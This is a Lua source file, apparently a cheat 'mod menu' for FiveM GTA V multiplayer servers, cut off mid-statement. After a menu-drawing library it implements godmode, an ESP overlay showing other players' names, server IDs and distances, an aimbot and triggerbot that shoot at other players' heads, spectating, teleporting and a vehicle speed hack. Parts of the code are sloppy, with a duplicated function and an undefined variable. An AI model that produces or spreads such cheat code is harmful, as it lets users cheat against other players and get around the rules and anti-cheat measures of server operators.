xnsadifnias = { }

xnsadifnias.debug = false

local function RGBRainbow( frequency )
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = 54
	result.g = 95
	result.b = 150
	
	return result
end


local menus = { }
local keys = { up = 172, down = 173, left = 174, right = 175, select = 176, back = 177 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005


local function debugPrint(text)
	if xnsadifnias.debug then
		Citizen.Trace('[xnsadifnias] '..tostring(text))
	end
end


local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
	end
end


local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end


local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, 'visible', visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry('STRING')
	AddTextComponentString(text)
	DrawText(x, y)
end


local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menuWidth, titleHeight, 0., 255, 255, 255, 255)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
	end
end


local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menuWidth, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
		end
	end
end


local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

		if subText then
			drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
		end
	end
end


function xnsadifnias.CreateMenu(id, title)
	-- Default settings
	menus[id] = { }
	menus[id].title = title
	menus[id].subTitle = 'INTERACTION MENU'

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10

	menus[id].titleFont = 1
	menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	Citizen.CreateThread(function()
		while true do
			Citizen.Wait(0)
			local ra = RGBRainbow(1.0)
			menus[id].titleBackgroundColor = { r = ra.r, g = ra.g, b = ra.b, a = 255 }
			menus[id].menuFocusBackgroundColor = { r = ra.r, g = ra.g, b = ra.b, a = 255 }
		end
	end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
	menus[id].menuSubTextColor = { r = 189, g = 189, b = 189, a = 255 }
	menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

	menus[id].subTitleBackgroundColor = { r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255 }

	menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id)..' menu created')
end


function xnsadifnias.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		xnsadifnias.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, 'subTitle', string.upper(subTitle))
		else
			setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, 'previousMenu', parent)

		setMenuProperty(id, 'x', menus[parent].x)
		setMenuProperty(id, 'y', menus[parent].y)
		setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
		setMenuProperty(id, 'titleFont', menus[parent].titleFont)
		setMenuProperty(id, 'titleColor', menus[parent].titleColor)
		setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
		setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
		setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
		setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
		setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
		setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
		setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
	else
		debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
	end
end


function xnsadifnias.CurrentMenu()
	return currentMenu
end


function xnsadifnias.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do Citizen.Wait(0) end
		end

		debugPrint(tostring(id)..' menu opened')
	else
		debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
	end
end


function xnsadifnias.IsMenuOpened(id)
	return isMenuVisible(id)
end


function xnsadifnias.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then return true end
	end

	return false
end


function xnsadifnias.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end


function xnsadifnias.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu)..' menu closed')
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu)..' menu about to be closed')
		end
	end
end


function xnsadifnias.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end


function xnsadifnias.MenuButton(text, id)
	if menus[id] then
		if xnsadifnias.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
	end

	return false
end


function xnsadifnias.CheckBox(text, bool, callback)
	local checked = '~r~~h~Off'
	if bool then
		checked = '~g~~h~On'
	end

	if xnsadifnias.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text)..' checkbox changed to '..tostring(bool))
		callback(bool)

		return true
	end

	return false
end


function xnsadifnias.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = '← '..tostring(selectedItem)..' →'
	end

	if xnsadifnias.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end


function xnsadifnias.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			xnsadifnias.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					xnsadifnias.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end


function xnsadifnias.SetMenuWidth(id, width)
	setMenuProperty(id, 'width', width)
end


function xnsadifnias.SetMenuX(id, x)
	setMenuProperty(id, 'x', x)
end


function xnsadifnias.SetMenuY(id, y)
	setMenuProperty(id, 'y', y)
end


function xnsadifnias.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, 'maxOptionCount', count)
end


function xnsadifnias.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
end
 
 
function xnsadifnias.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
end


function xnsadifnias.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end


function xnsadifnias.SetSubTitle(id, text)
	setMenuProperty(id, 'subTitle', string.upper(text))
end


function xnsadifnias.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
end


function xnsadifnias.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
end

function xnsadifnias.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
end

function xnsadifnias.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
end


function xnsadifnias.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end


function KeyboardInput(TextEntry, ExampleText, MaxStringLength)

	AddTextEntry('FMMC_KEY_TIP1', TextEntry .. ':')
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true 

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end
		
	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(player) then
			players[#players + 1] = i
		end
	end
	return players
end

function DrawText3D(x,y,z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow( frequency )
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor( math.sin( curtime * frequency + 0 ) * 127 + 128 )
	result.g = math.floor( math.sin( curtime * frequency + 2 ) * 127 + 128 )
	result.b = math.floor( math.sin( curtime * frequency + 4 ) * 127 + 128 )
	
	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end

local allWeapons = {"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}

local Enabled = true

local function TeleportToWaypoint()
	
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end
	
	local zHeigt = 0.0 height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)
			
			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t={}  i=1
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

function RunningESX()
		local Attempt = 0
		local Found = false
	
	while Attempt <= 1 do
		print('Ruby menu : ON')
		Attempt = Attempt + 1
		
		if ESX ~= nil then Found = true break end
	end

	return Found
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if(Spectating)then

		local targetx,targety,targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx,targety,targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification('Spectating '..GetPlayerName(player))
	else

		local targetx,targety,targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx,targety,targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification('Stopped Spectating '..GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
	ToggleVehicleMod(veh, 18, 1)
	SetVehicleMod(veh, 12, 2, 0)
	SetVehicleMod(veh, 11, 3, 0)
	SetVehicleMod(veh, 13, 2, 0)
	SetVehicleModKit(veh, 0)
	SetVehicleModKit(veh, 0)
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification('Hung for 5 seconds, killing to prevent issues...')
		end
	end
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end


-- MAIN CODE --
function GetPlayers()
    local players = {}

    for i = 0, 63 do
        if NetworkIsPlayerActive(i) then
            table.insert(players, i)
        end
    end

    return players
end

Citizen.CreateThread(function()
	local currentPlayer = PlayerId()

	while Enabled do
		Citizen.Wait(0)

		local players = GetPlayers()
		
		SetPlayerInvincible(PlayerId(), Godmode)
		SetEntityInvincible(PlayerPedId(), Godmode)
		if esp then
			for player = 0, 256 do
				if player ~= currentPlayer and NetworkIsPlayerActive(player) then
					local playerPed = GetPlayerPed(player)
					local playerName = GetPlayerName(player)
					local ra = RGBRainbow(1.0)
					local pPed = GetPlayerPed(player)
					local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
					local x, y, z = table.unpack(GetEntityCoords(pPed))
					local message = "~h~Name: "..GetPlayerName(player).."\nServer ID: "..GetPlayerServerId(player).."\nPlayer ID: "..player.."\nDist: "..math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
					if IsPedInAnyVehicle(pPed, true) then
						local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
						message = message.."\nVeh: "..VehName
					end
					if info then
						DrawText3D(x,y,z+1.0, message, ra.r, ra.g, ra.b)
					end

					LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
					LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
					LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

					TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
					TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
					TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

					ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
					ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
					ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
					ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
					ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					
					if lines then
						local ra = RGBRainbow(1.0)
						DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
					end
					if box then
						local ra = RGBRainbow(1.0)
						DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, ra.r, ra.g, ra.b, 255)
						DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, ra.r, ra.g, ra.b, 255)
						DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, ra.r, ra.g, ra.b, 255)

					end
				end
			end
		end
		
		if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
		end
	
		if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(0, 118) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 100.0)
			elseif IsControlPressed(0, 109) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end

		if TriggerBot then
			local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
			if Aiming then
				if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
					ShootPlayer(Entity)
				end
			end
		end

		if AimBot then
			for player=1, #getPlayerIds() do
				if player ~= PlayerId() then
					if IsPlayerFreeAiming(PlayerId()) then
						local TargetPed = GetPlayerPed(player)
						local TargetPos = GetEntityCoords(TargetPed)
						local Exist = DoesEntityExist(TargetPed)
						local Dead = IsPlayerDead(TargetPed)

						if Exist and not Dead then
							local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
							if IsEntityVisible(TargetPed) and OnScreen then
								if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
									local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
									SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
								end
							end
						end	
					end
				end
			end
		end
		
		DisplayRadar(true)

		if Stamania then
